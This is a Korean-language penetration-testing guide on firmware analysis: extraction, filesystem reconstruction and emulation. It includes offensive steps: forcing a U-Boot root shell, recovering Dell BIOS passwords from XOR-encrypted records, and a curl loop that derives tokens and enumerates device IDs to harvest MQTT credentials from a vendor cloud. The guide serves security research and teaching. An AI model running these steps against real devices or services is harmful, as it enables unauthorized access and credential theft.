# 펌웨어 분석

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **소개**

### 관련 자료

노출된 하드웨어 인터페이스에서 펌웨어를 획득하는 방법은 [UART 콘솔을 사용한 펌웨어 덤프](../hardware-hacking/uart.md#dumping-firmware-with-uart-console)와 [SPI 플래시 덤프](../hardware-hacking/spi.md#dumping-firmware-from-eeproms)를 참고하세요. 콘솔에 접근하기 전에 부팅 시점의 UART를 반복해서 캡처하는 방법은 [SCPI로 제어하는 전원 및 오실로스코프 획득](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi)을 참고하세요.

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

펌웨어는 하드웨어 구성 요소와 사용자가 이용하는 소프트웨어 간 통신을 관리하고 지원하여 기기가 올바르게 작동하도록 하는 필수 소프트웨어입니다. 펌웨어는 영구 메모리에 저장되므로 기기의 전원이 켜지는 순간부터 중요한 명령어에 접근할 수 있으며, 이를 통해 운영 체제가 실행됩니다. 보안 취약점을 식별하려면 펌웨어를 검사하고 필요에 따라 수정하는 과정이 중요합니다.<sup>[[2]](#references)[[3]](#references)</sup>

## **정보 수집**

**정보 수집**은 기기의 구성과 사용 기술을 파악하는 중요한 초기 단계입니다. 이 과정에서는 다음과 같은 데이터를 수집합니다.

- CPU 아키텍처 및 실행 중인 운영 체제
- 부트로더 세부 정보
- 하드웨어 구성 및 데이터시트
- 코드베이스 규모 및 소스 위치
- 외부 라이브러리 및 라이선스 유형
- 업데이트 이력 및 규제 인증
- 아키텍처 및 흐름 다이어그램
- 보안 평가 및 확인된 취약점

이때 **오픈소스 인텔리전스(OSINT)** 도구가 매우 유용하며, 수동 및 자동 검토를 통해 이용 가능한 오픈소스 소프트웨어 구성 요소를 분석하는 것도 중요합니다. [Coverity Scan](https://scan.coverity.com) 및 [Semmle’s LGTM](https://lgtm.com/#explore)과 같은 도구는 잠재적인 문제를 찾는 데 활용할 수 있는 무료 정적 분석 기능을 제공합니다.

## **펌웨어 획득**

펌웨어는 난이도가 각기 다른 여러 방법으로 획득할 수 있습니다.

- 개발자나 제조업체 등 소스에서 **직접 획득**
- 제공된 지침에 따라 **빌드**
- 공식 지원 사이트에서 **다운로드**
- 호스팅된 펌웨어 파일을 찾기 위해 **Google dork** 쿼리 사용
- [S3Scanner](https://github.com/sa7mon/S3Scanner)와 같은 도구로 **cloud storage**에 직접 접근
- man-in-the-middle 기법으로 **업데이트 가로채기**
- **UART**, **JTAG** 또는 **PICit** 같은 연결을 통해 기기에서 **추출**
- 기기 통신에서 업데이트 요청 **스니핑**
- **하드코딩된 업데이트 엔드포인트**를 찾아 사용
- 부트로더나 네트워크에서 **덤프**
- 다른 방법이 모두 실패하면 적절한 하드웨어 도구를 사용해 저장 칩을 **제거하고 읽기**

### UART 전용 로그: 플래시의 U-Boot 환경 변수를 통해 root shell 강제 실행

UART RX가 무시되는 경우(로그만 출력되는 경우)에도 오프라인에서 **U-Boot 환경 변수 blob을 편집**하여 init shell을 강제 실행할 수 있습니다.<sup>[[6]](#references)</sup>

1. SOIC-8 클립과 프로그래머(3.3V)를 사용해 SPI 플래시를 덤프합니다.
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env 파티션을 찾고, `bootargs`를 편집해 `init=/bin/sh`를 추가한 다음, blob의 **U-Boot env CRC32를 다시 계산합니다**.
3. env 파티션만 다시 플래시하고 재부팅하면 UART에 셸이 나타납니다.

이 방법은 부트로더 셸은 비활성화되어 있지만 외부 플래시 접근을 통해 env 파티션에 쓸 수 있는 임베디드 장치에서 유용합니다.

## 펌웨어 분석하기

이제 **펌웨어를 확보했으므로**, 펌웨어를 어떻게 다룰지 알기 위해 정보를 추출해야 합니다. 이를 위해 사용할 수 있는 도구는 다음과 같습니다:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

해당 도구로 별다른 결과를 얻지 못했다면 `binwalk -E <bin>`으로 이미지의 **entropy**를 확인하세요. entropy가 낮으면 암호화되지 않았을 가능성이 높습니다. entropy가 높으면 암호화되었거나 어떤 방식으로든 압축되었을 가능성이 높습니다.

또한 다음 도구를 사용해 **firmware 내부에 포함된 파일**을 추출할 수 있습니다:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

파일을 검사하려면 [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/))를 사용할 수도 있습니다.

### 차등 flash 분석 및 복구 가능한 XOR 비밀 저장소

firmware 설정의 저장 형식이 문서화되어 있지 않다면, 먼저 일치하는 flash 읽기 결과를 여러 개 확보한 다음 **정확히 하나의** 설정을 변경하고 칩 전체를 다시 덤프한 뒤 오프셋을 비교하세요. 값을 제어해 이 실험을 반복하면 해당 설정과 카운터 및 쓰기 메타데이터를 구분할 수 있습니다. 제자리에서 변경되는 대신 새 오프셋에 변경 사항이 기록된다면 추가 전용 또는 로그 구조 저장소일 수 있습니다. 삭제되었거나 tombstone 처리된 항목도 유지하세요. 페이로드 바이트를 복구할 수 있는 경우가 있습니다.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

영역을 찾은 후 `binwalk`와 같은 도구로 펌웨어 모듈을 추출하고, Ghidra에서 writer/validator를 리버스 엔지니어링합니다. 암호문 패턴만으로 방식을 추론하지 말고, 코드에서 필드 경계, 패딩, 키 인덱싱, 키 파생을 확인합니다.<sup>[[12]](#references)</sup>

#### 암호화된 0 패딩에서 키 복구

[ XOR-based encryption](../../crypto/symmetric/#xor-based-encryption)에서 설명한 것처럼, 알려진 평문은 같은 오프셋의 키스트림 바이트를 드러냅니다. 고정 크기 필드의 0 패딩이 반복 XOR 키의 모든 인덱스를 포함하면 특히 취약합니다. `0x00 XOR key_byte = key_byte`이므로 암호화된 패딩에서 해당 키 바이트를 직접 알아낼 수 있습니다. 모든 키 인덱스가 포함되어 있다면 암호문의 끝부분에서 키를 재구성하고, 데이터가 채워진 바이트를 복호화합니다.<sup>[[12]](#references)</sup>

Dell의 취약한 DVAR BIOS 암호 형식이 구체적인 예입니다. 32바이트 필드의 `0`번 바이트는 평문이고, `1..31`번 바이트에는 반복되는 20바이트 키가 사용됩니다.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

비밀번호 길이 `L`의 경우, XOR 이전에 위치 `L..31`은 0이었습니다. `L <= 12`이면 해당 위치가 모든 키 인덱스를 포함하므로, brute force 없이 전체 키와 비밀번호를 복구할 수 있습니다:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### 과거 레코드에서 키 가져오기

각 레코드를 독립적으로 분석하지 마세요. DVAR 키는 대략 `modified_md5(device_seed || variable_GUID || password[0])`로 파생됩니다. device seed와 GUID는 고정되어 있고, 비밀번호에 따라 달라지는 입력은 평문 첫 바이트뿐입니다. 따라서 장치당 키는 최대 256개이며, 같은 바이트로 시작하는 레코드들은 같은 키를 공유합니다. 활성 레코드와 삭제된 레코드를 해당 바이트별로 그룹화하세요. 과거의 짧은 레코드는 padding을 통해 전체 키를 leak할 수 있으며, 자체 padding만으로는 충분하지 않은 현재의 더 긴 레코드를 복호화하는 데 사용할 수 있습니다. 따라서 비밀번호를 변경하면서 이전 암호문을 삭제 표시만 하고 지우지 않으면 노출 위험이 커질 수 있습니다.<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) 도구는 DVAR을 찾고, 후보 레코드를 검증하고, 비밀번호를 복구하며, 저장된 원시 바이트와 키 바이트를 표시할 수 있습니다. 체크아웃한 저장소에서 도구를 빌드한 다음, 검증된 플래시 이미지를 다음과 같이 스캔하세요.<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

커스텀 파서는 레코드 구조, 출력 가능한 문자 제약 조건, zero-padding 검사, key entropy, 그리고 key가 순환할 때의 일관성을 사용해 false positive를 거부해야 합니다. 반복 덤프에서 쓰기마다 드문 bit flip이 나타나면 관찰된 마스크를 열거하고 이러한 제약 조건에 따라 보정값의 순위를 매기되, 휴리스틱 결과를 정확한 복구 결과로 제시하지 말고 모호한 문자를 보고해야 합니다.<sup>[[12]](#references)</sup>

Password verifier는 복호화 가능한 ciphertext 대신 salt를 적용하고 반복 처리한 one-way hash를 저장해야 하며, log-structured store는 대체된 secret material을 안전하게 제거해야 합니다.<sup>[[12]](#references)</sup>

### 파일시스템 가져오기

앞서 주석으로 소개한 `binwalk -ev <bin>` 같은 도구를 사용했다면 **파일시스템을 추출**할 수 있었을 것입니다.\
Binwalk는 보통 **파일시스템 유형을 이름으로 하는 폴더**에 파일시스템을 추출합니다. 일반적인 유형은 다음과 같습니다: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### 파일시스템 수동 추출

경우에 따라 binwalk의 signature에 **파일시스템의 magic byte가 없을 수 있습니다**. 이럴 때는 binwalk를 사용해 **파일시스템의 오프셋을 찾고 바이너리에서 압축된 파일시스템을 carve한 다음**, 아래 단계를 따라 유형에 맞게 파일시스템을 **수동으로 추출**합니다.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

다음 **dd command**를 실행하여 Squashfs 파일 시스템을 카빙합니다.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

또는 다음 명령을 실행할 수도 있습니다.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs의 경우 (위 예제에서 사용)

`$ unsquashfs dir.squashfs`

이후 파일은 "`squashfs-root`" 디렉터리에 저장됩니다.

- CPIO 아카이브 파일

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 파일시스템의 경우

`$ jefferson rootfsfile.jffs2`

- NAND flash를 사용하는 ubifs 파일시스템의 경우

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### 분할된 임베디드 root 파일시스템 재구성

raw eMMC/SSD 덤프에 유효한 파일시스템 헤더가 있지만 메타데이터 오프셋이 명목상 파티션 범위를 넘어가는 경우, 즉시 손상된 것으로 분류하지 마세요. 임베디드 부팅 코드는 Device Mapper를 사용해 여러 물리적 범위에서 실제 root 디바이스를 구성할 수 있으므로, GPT 파티션 하나만 카빙하면 첫 번째 세그먼트만 추출됩니다.<sup>[[9]](#references)</sup>

#### 전체 미디어 이미지 초기 분류

먼저 획득 작업이 완료되었는지, 크기가 안정적인지, 이미지에 쓰기 작업을 수행하는 프로세스가 없는지 확인하세요. 파일명에 시작/종료 주소가 인코딩되어 있다면 해당 범위와 실제 바이트 수를 비교하세요. GPT를 읽기 전용 모드로 복구하고 필요한 범위만 연결하세요. 워크스테이션에서 신뢰할 수 없는 물리 볼륨에 `vgchange -ay`를 실행하지 **마세요**. 볼륨 그룹이 충돌하거나 의도치 않은 쓰기가 발생할 수 있습니다.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

원래의 init 로직이나 LVM 스택이 전체 이미지를 확인해야 한다면 폐기 가능한 VM을 사용하세요. 표준 boot partition의 과거 boot log는 특히 유용합니다. bootloader가 proprietary container의 오프셋, component 길이, slot 선택, 정렬 규칙, signature verification을 기록했을 수 있습니다. 이 값을 사용해 내장된 command line/kernel/initramfs를 추출한 다음, 각 출력을 `file`, magic bytes, `binwalk`로 개별 검증하세요. container 끝까지 읽으면 initrd, ACPI object 또는 signature가 실수로 kernel에 덧붙을 수 있습니다.<sup>[[9]](#references)</sup>

#### boot-time block map 복구

kernel의 initramfs를 추출하고 `/init` 및 관련 storage library를 reverse engineering하세요. [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/)에서 `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64`, partition path에 대한 string reference를 찾은 다음, 활성 A/B slot을 선택하고 table을 구성하는 코드를 추적하세요. radare2에서 유용한 시작 명령은 `r2 -A init`, `afl`, `pdf @ main`, `pdf @ fcn.xxxxx`입니다.<sup>[[9]](#references)</sup>

linear target은 가상 장치의 연속된 범위를 하나 이상의 backing device 범위에 매핑합니다. 복구한 2-segment table은 일반적으로 다음과 같은 형태입니다(모든 위치와 길이는 512-byte sector 단위).<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

정수 폭, 시프트 및 단위 변환을 포함해 기계 코드의 산술 연산을 정확히 재현하세요. 예를 들어, 다음 식은 바이트 크기를 4KiB 경계로 내림한 다음에야 512바이트 섹터로 변환합니다. 이를 `p4_bytes // 512`로 바꾸면 파티션이 페이지 경계에 맞지 않을 때마다 선택된 끝부분이 `p4_bytes % 4096`만큼 이동합니다.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

테이블 순서대로 범위를 복사하고 청크 크기를 제한해 flat analysis image를 재구성하면, 미디어 덤프 전체를 메모리에 로드하지 않아도 됩니다. 이렇게 하면 호스트 측 mapper device를 만드는 일도 피할 수 있습니다. GPT에서 파생한 오프셋, 역순 섹터 수, 결과 출력 길이는 각각 별도의 assertion으로 확인하세요.<sup>[[9]](#references)</sup>

#### 손상과 일정한 재구성 오류 구분하기

SquashFS의 경우 `unsquashfs`를 실행하기 전에 `hsqs` magic을 확인하고, superblock 오프셋 40에 있는 little-endian 64-bit `bytes_used` 필드를 디코딩하세요. 서로 관련 없는 여러 구조에서 추출이 실패하면, 예상 위치 주변의 넓은 범위를 검색해 강력한 구조적 후보를 확인하세요. 후보에는 압축 해제 가능한 metadata block, 연속해서 유효한 directory entry 여러 개, 그럴듯한 inode 필드, inode 수와 일치하는 root inode, 또는 유효한 integrity-metadata 구조가 포함될 수 있습니다. magic이 하나만 일치하는 것으로는 충분하지 않습니다.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

동일한 signed delta로 서로 독립적인 구조가 유효해진다면(예: 디렉터리 메타데이터와 verity 레코드), 누락된 바이트보다는 세그먼트 시작 위치의 체계적인 오류가 원인일 가능성이 높습니다. orphan 복구나 파일시스템 메타데이터 패치를 시도하기 전에 역산으로 돌아가 버려진 나머지 값, signedness, overflow, sector/page 반올림을 살펴보세요.<sup>[[9]](#references)</sup>

마지막으로 보호 경계를 구분하세요. TPM-sealed LUKS 볼륨은 데이터 기밀성을 보호하고, signed dm-verity 매핑은 root 파일시스템 무결성을 보호합니다. 소프트웨어 TPM은 원래 물리 TPM에 봉인된 키를 복구하지 못하며, verity 검증을 생략하는 연구 전용 init을 통해 수정된 SquashFS를 부팅하더라도 서명을 위조하거나 dm-verity를 무력화하는 것은 아닙니다.<sup>[[9]](#references)</sup>

## 펌웨어 분석

펌웨어를 확보한 뒤에는 구조와 잠재적 취약점을 파악하기 위해 펌웨어를 분석하는 것이 중요합니다. 이 과정에서는 여러 도구를 사용해 펌웨어 이미지를 분석하고 유용한 데이터를 추출합니다.

### 초기 분석 도구

바이너리 파일(`<bin>`으로 표시)을 초기 검사하는 명령어 모음이 제공됩니다. 이 명령어는 파일 유형 식별, 문자열 추출, 바이너리 데이터 분석, 파티션 및 파일시스템 세부 정보 파악에 도움이 됩니다:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

이미지의 암호화 상태를 평가하려면 `binwalk -E <bin>`으로 **엔트로피**를 확인합니다. 엔트로피가 낮으면 암호화되지 않았을 가능성이 높고, 엔트로피가 높으면 암호화되었거나 압축되었을 가능성이 있습니다.

**임베디드 파일**을 추출하려면 **file-data-carving-recovery-tools** 문서와 파일 검사를 위한 **binvis.io** 같은 도구와 리소스를 권장합니다.

### 파일시스템 추출

`binwalk -ev <bin>`을 사용하면 일반적으로 파일시스템을 추출할 수 있으며, 추출된 파일은 대개 파일시스템 유형을 이름으로 하는 디렉터리(예: squashfs, ubifs)에 저장됩니다. 하지만 **binwalk**가 매직 바이트 누락으로 파일시스템 유형을 인식하지 못하면 수동으로 추출해야 합니다. 이때 `binwalk`로 파일시스템의 오프셋을 찾은 다음 `dd` 명령어로 파일시스템을 추출합니다:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

이후 파일 시스템 유형(예: squashfs, cpio, jffs2, ubifs)에 따라 콘텐츠를 수동으로 추출하는 데 서로 다른 명령을 사용합니다.

### 파일 시스템 분석

파일 시스템을 추출하면 보안 결함을 찾기 시작합니다. 안전하지 않은 네트워크 데몬, 하드코딩된 자격 증명, API 엔드포인트, 업데이트 서버 기능, 컴파일되지 않은 코드, 시작 스크립트, 오프라인 분석을 위한 컴파일된 바이너리에 주의를 기울입니다.

검사할 **주요 위치** 및 **항목**은 다음과 같습니다.

- 사용자 자격 증명을 확인할 **etc/shadow** 및 **etc/passwd**
- **etc/ssl**의 SSL 인증서 및 키
- 잠재적 취약점이 있는 구성 파일 및 스크립트 파일
- 추가 분석을 위한 임베디드 바이너리
- 일반적인 IoT 기기 웹 서버 및 바이너리

다음 도구를 사용하면 파일 시스템 내의 민감한 정보와 취약점을 찾을 수 있습니다.

- 민감한 정보 검색을 위한 [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 및 [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 포괄적인 펌웨어 분석을 위한 [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- 정적 및 동적 분석을 위한 [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) 및 [**EMBA**](https://github.com/e-m-b-a/emba)

### 컴파일된 바이너리의 보안 검사

파일 시스템에서 발견한 소스 코드와 컴파일된 바이너리 모두 취약점이 있는지 면밀히 검사해야 합니다. Unix 바이너리용 **checksec.sh** 및 Windows 바이너리용 **PESecurity**와 같은 도구는 악용될 수 있는 보호되지 않은 바이너리를 식별하는 데 도움이 됩니다.

## 파생된 URL 토큰을 통한 cloud 구성 및 MQTT 자격 증명 수집

많은 IoT 허브는 다음과 같은 cloud 엔드포인트에서 기기별 구성을 가져옵니다.<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

펌웨어 분석 중에 `<token>`이 하드코딩된 비밀 키를 사용해 기기 ID에서 로컬로 파생되는 것을 발견할 수 있습니다. 예를 들면 다음과 같습니다.

- token = MD5( deviceId || STATIC_KEY )이며 대문자 16진수로 표현됨

이 설계에서는 기기 ID와 STATIC_KEY를 알아낸 누구나 URL을 재구성하고 cloud 구성을 가져올 수 있습니다. 이 구성에는 평문 MQTT 자격 증명과 topic 접두사가 포함된 경우가 많습니다.

실제 작업 흐름:

1) UART 부팅 로그에서 deviceId 추출

- 3.3V UART 어댑터(TX/RX/GND)를 연결하고 로그를 캡처합니다:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- cloud config URL 패턴과 broker 주소를 출력하는 줄을 찾습니다. 예를 들면:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) 펌웨어에서 STATIC_KEY와 token 알고리즘 복구

- 바이너리를 Ghidra/radare2에 로드하고 config 경로("/pf/") 또는 MD5 사용 여부를 검색합니다.
- 알고리즘을 확인합니다(예: MD5(deviceId||STATIC_KEY)).
- Bash에서 token을 도출하고 digest를 대문자로 변환합니다:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) 클라우드 설정 및 MQTT 자격 증명 수집

- URL을 구성하고 curl로 JSON을 가져온 다음, jq로 파싱해 비밀 정보를 추출합니다:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 평문 MQTT와 취약한 topic ACL 악용(있는 경우)

- 복구한 자격 증명을 사용해 maintenance topic을 구독하고 민감한 이벤트를 찾습니다:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 예측 가능한 device ID 열거(대규모로, 승인받은 경우)

- 많은 생태계는 vendor OUI/product/type 바이트 뒤에 순차 접미사를 붙입니다.
- 후보 ID를 순회하고, 토큰을 도출한 다음, 프로그래밍 방식으로 config를 가져올 수 있습니다:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

참고
- 대량 열거를 시도하기 전에 항상 명시적인 승인을 받으세요.
- 가능하면 대상 하드웨어를 수정하지 않고 비밀을 복구할 수 있도록 에뮬레이션 또는 정적 분석을 우선하세요.


펌웨어를 에뮬레이션하면 기기의 동작이나 개별 프로그램에 대한 **동적 분석**을 수행할 수 있습니다. 이 접근 방식은 하드웨어 또는 아키텍처 종속성으로 인해 어려움이 생길 수 있지만, 루트 파일 시스템이나 특정 바이너리를 Raspberry Pi처럼 아키텍처와 엔디안이 일치하는 기기 또는 사전 구축된 가상 머신으로 옮기면 추가 테스트를 진행하는 데 도움이 됩니다.

### 개별 바이너리 에뮬레이션

단일 프로그램을 검사할 때는 프로그램의 엔디안과 CPU 아키텍처를 파악하는 것이 중요합니다.

#### MIPS 아키텍처 예시

MIPS 아키텍처 바이너리를 에뮬레이션하려면 다음 명령어를 사용할 수 있습니다:

```bash
file ./squashfs-root/bin/busybox
```

그리고 필요한 에뮬레이션 도구를 설치하려면:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS(big-endian)의 경우 `qemu-mips`를 사용하고, little-endian 바이너리에는 `qemu-mipsel`을 사용합니다.

#### ARM 아키텍처 에뮬레이션

ARM 바이너리도 비슷한 방식으로 처리하며, `qemu-arm` 에뮬레이터를 사용해 에뮬레이션합니다.

### 전체 시스템 에뮬레이션

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 등의 도구는 전체 펌웨어 에뮬레이션을 지원하여 프로세스를 자동화하고 동적 분석을 돕습니다.

### 에뮬레이션을 위한 분할 및 검증된 루트 파일시스템 재구성

SquashFS superblock은 읽을 수 있지만 inode, directory 또는 fragment-table 오프셋이 타당하지 않다면 `unsquashfs`를 바로 패치하지 마세요. 초기 부팅 바이너리를 역공학하고 해당 바이너리가 생성하는 블록 장치 그래프를 재현하세요. 임베디드 시스템은 명목상의 root 파티션을 노출하면서도 다른 파티션에서 빌린 섹터를 덧붙이는 `dm-linear` 매핑으로 실제 파일시스템을 구성할 수 있습니다. Superblock만 검사하면 이후의 모든 메타데이터 블록 위치가 어긋나 있어도 정상으로 보일 수 있습니다.<sup>[[11]](#references)</sup>

펌웨어의 산술 연산을 정확히 보존하세요. 특히 길이 단위가 바이트, 512바이트 섹터 또는 4 KiB 페이지 중 무엇인지 확인하고, 원래 순서대로 shift와 절삭을 재현하며, A/B 레이아웃의 bank에 따라 달라지는 후미 영역을 고려하세요. 예를 들어 `(partition_bytes >> 12) << 3`은 먼저 4 KiB 경계로 절삭한 뒤 결과를 512바이트 섹터 단위로 나타냅니다. 이를 `partition_bytes // 512`로 바꾸면 덧붙인 extent의 위치가 몇 킬로바이트 정도 이동해 이후의 모든 SquashFS 테이블이 손상될 수 있습니다.<sup>[[11]](#references)</sup>

유용한 검증 절차는 다음과 같습니다.<sup>[[11]](#references)</sup>

1. verifier/init 바이너리에서 각 `dm-linear` segment의 소스 장치, 시작 섹터, 길이를 확인합니다.
2. 정렬 방식의 의미를 바꾸지 않고 extent를 연결하거나 매핑합니다.
3. 추출이 계속 실패하면 예상 경계 주변의 작은 범위만 검색하고, 그럴듯한 superblock 하나만으로 판단하지 말고 여러 개의 유효한 메타데이터 구조가 연속해서 나오는지 확인합니다.
4. 수정하지 않은 `unsquashfs`를 재구성한 이미지에 실행합니다. 모든 디렉터리와 fragment를 성공적으로 순회하는 것이 `unsquashfs -stat`보다 강력한 근거입니다.

#### 분석가가 제어하는 dm-verity 대체

분석가가 QEMU kernel, initramfs, 가상 디스크를 제어하는 경우, 벤더의 검증용 PID 1을 작은 정적 링크 init으로 교체하여 수정된 root를 부팅할 수 있습니다. 이는 **실험실 부팅 체인 대체**이며, dm-verity, RSA signature, Secure Boot 또는 TPM에 봉인된 키를 깨는 것이 아닙니다.<sup>[[11]](#references)</sup>

대체 init은 원래 부팅 경로의 동작상 필요한 부분을 그대로 따라야 합니다. `devtmpfs`를 마운트하고, `setsid()`를 호출하고, `/dev/console`을 파일 디스크립터 0–2에 연결하고, `/proc` 및 `/sys`를 마운트한 다음, 제공된 블록 장치를 기다립니다. 편집한 root를 읽기 전용으로 마운트하고, 이전 root의 pseudo-filesystem을 분리한 뒤, 새 마운트를 `/`에 이동하고, `chroot`한 다음 펌웨어의 원래 `/sbin/init`을 `execve()`로 실행합니다. `MS_MOVE` **전에** `/dev`, `/proc`, `/sys`를 분리하면 새 root에 속한 마운트 지점이 실수로 분리되는 일을 방지할 수 있습니다.<sup>[[11]](#references)</sup>

수정한 불변 root와 변경 가능한 장치 상태는 분리해 두세요. qcow2 overlay를 사용하면 원본 디스크의 LVM 상태를 보존하면서 두 번째 읽기 전용 virtio 디스크로 편집한 SquashFS를 제공할 수 있습니다.<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### 오프라인 이미지 상태 디버깅

부팅이 느리거나, 파괴적인 시작 스크립트가 실행되거나, 콘솔 로그가 불안정해 문제 원인을 파악하기 어려운 경우 게스트 외부에서 영구 상태를 검사합니다. 실행 중인 VM이 사용 중인 overlay는 절대 연결하지 마세요. `qemu-nbd`로 노출하고, LVM 검색 범위를 의도한 NBD 파티션으로 제한한 다음, 연결을 해제하기 전에 볼륨 그룹을 비활성화하세요.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

